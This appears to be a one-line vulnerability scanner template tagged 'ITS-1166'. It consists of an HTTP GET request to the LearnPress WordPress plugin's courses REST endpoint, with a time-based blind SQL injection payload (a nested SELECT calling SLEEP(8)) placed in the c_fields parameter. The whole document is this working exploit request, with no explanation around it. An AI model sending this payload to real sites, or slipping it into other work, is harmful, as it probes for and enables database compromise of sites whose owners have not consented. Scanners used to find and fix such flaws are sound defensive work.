# Vulnerable: ITS-1166
GET /wp-json/learnpress/v1/courses?c_fields=(SELECT(0)FROM(SELECT(SLEEP(8)))a)/*{{randstr}}*/
